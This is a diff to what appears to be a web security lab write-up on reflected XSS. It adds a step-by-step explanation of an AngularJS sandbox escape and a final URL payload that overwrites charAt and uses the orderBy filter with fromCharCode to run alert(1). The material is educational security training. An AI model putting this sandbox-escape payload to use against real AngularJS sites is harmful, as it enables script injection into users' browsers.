@@ -9,13 +9,27 @@
 ## 🔍 Summary
 This lab contains a **reflected XSS** vulnerability where `eval` function cannot be used to insert string into **Angular JS**.
 
-## 🛠 Steps to Solve
+## 🛠 Payload
 1. `toString().constructor`
    - `toString()` gives you a string.
    - `.constructor` gives you the **String constructor**.
      
-2. `prototype.charAt=[].join`
-   - 
+2. ` .prototype.charAt=[].join`
+   - Normally, Angular uses `charAt` during string access checks in sandboxing.
+   - Overwriting `charAt` breaks the sandbox because Angular uses it internally for security parsing.
+   - `[].join` is a safe method that doesn't throw errors, so it's often used to stub functions.
+  
+3. `[1] | orderBy: ...`
+   - This uses AngularJS' filter system. `orderBy` can evaluate arbitary code in sandboxed Angular if we break it correctly.
+   - `[1]` is just a dummy array to trigger the filter.
+  
+4. `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
+   - This builds the string: "x=alert(1)".
+  
+5. Final Payload:
+   ```sh
+   ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+   ```
 
 ## 📖 Key Takeaways
 - AngularJS can be exploited even when strings and `$eval` are blocked.
